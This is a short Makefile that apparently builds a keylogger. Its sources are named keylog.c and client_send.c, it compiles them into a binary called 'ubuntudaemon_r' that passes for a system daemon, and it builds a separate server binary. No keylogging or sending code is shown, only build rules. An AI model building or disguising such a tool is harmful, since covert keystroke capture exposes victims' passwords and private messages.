OBJS1 = keylog.h client_send.c keylog.c
OBJS2 = server.o
CC = gcc

all : ubuntudaemon_r server clean

server : $(OBJS2)
	$(CC) $(OBJS2) -o server

ubuntudaemon_r : $(OBJS1)
	$(CC) $(OBJS1) -o ubuntudaemon_r

clean:
	\rm *.o